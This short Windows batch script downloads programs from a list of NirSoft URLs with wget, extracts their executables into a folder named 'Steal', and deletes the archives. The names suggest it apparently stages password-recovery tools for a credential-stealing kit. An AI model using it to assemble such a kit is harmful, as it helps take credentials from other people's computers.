@echo off

cd %~dp0/Tools/wget
for /f "delims=" %%i in ('type %~dp0\Url_Nirsoft.txt') do wget.exe -N %%i -P %~dp0/zipFiles

cd %~dp0/Tools/7-Zip
7z.exe x %~dp0/zipFiles/*.zip *.exe -o%~dp0/../Steal -y

cd %~dp0/zipFiles/
del *.zip /Q

exit